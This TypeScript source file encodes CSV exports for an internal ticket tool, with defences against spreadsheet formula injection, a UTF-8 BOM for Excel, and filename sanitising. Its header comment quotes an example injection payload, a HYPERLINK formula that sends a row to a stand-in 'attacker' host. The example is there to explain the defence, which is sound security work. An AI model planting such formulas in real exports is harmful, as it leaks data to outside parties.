/**
 * CSV encoding.
 *
 * Two things here are not obvious and both matter.
 *
 * 1. FORMULA INJECTION. A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`,
 *    or a leading tab/carriage return as a formula, so a ticket titled
 *    `=HYPERLINK("http://attacker/"&A1)` becomes a live link that exfiltrates the
 *    row when a colleague opens the export. This is a real, routinely-exploited
 *    class of bug in "just an export" features, and the export here carries text
 *    that any employee can type. Such cells are prefixed with an apostrophe,
 *    which every major spreadsheet treats as "this is text".
 *
 * 2. THE BOM. Excel assumes the system codepage for a .csv unless the file starts
 *    with a UTF-8 byte-order mark, so names with non-ASCII characters arrive
 *    mangled without it. The BOM is harmless everywhere else.
 *
 * Why CSV and not .xlsx: a real xlsx writer is a substantial dependency, and the
 * Cloudflare Workers free plan caps the script at ~1 MB. Spending most of that
 * budget on spreadsheet formatting would be a poor trade for an internal tool.
 * CSV opens in Excel. Recorded in REQUIREMENTS §7 as a deliberate limitation
 * rather than an oversight.
 */

export const UTF8_BOM = '﻿';

const NEEDS_QUOTING = /[",\r\n]/;
/** Leading characters a spreadsheet may interpret as the start of a formula. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export type CsvValue = string | number | boolean | null | undefined;

export function csvCell(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number') {
    // Non-finite numbers would render as "NaN"/"Infinity" and read as text.
    return Number.isFinite(value) ? String(value) : '';
  }
  if (typeof value === 'boolean') return value ? 'true' : 'false';

  let s = value;
  if (FORMULA_LEAD.test(s)) s = `'${s}`;
  if (NEEDS_QUOTING.test(s)) s = `"${s.replace(/"/g, '""')}"`;
  return s;
}

export function csvRow(values: readonly CsvValue[]): string {
  return values.map(csvCell).join(',');
}

/**
 * A complete CSV document.
 *
 * CRLF line endings, because that is what RFC 4180 specifies and what Excel on
 * Windows expects.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly CsvValue[])[],
): string {
  return UTF8_BOM + [csvRow(header), ...rows.map(csvRow)].join('\r\n') + '\r\n';
}

/** A filesystem- and header-safe filename. */
export function csvFilename(base: string, isoDate: string): string {
  const safe = base.replace(/[^a-zA-Z0-9-_]+/g, '-').replace(/-+/g, '-').toLowerCase();
  return `${safe}-${isoDate}.csv`;
}
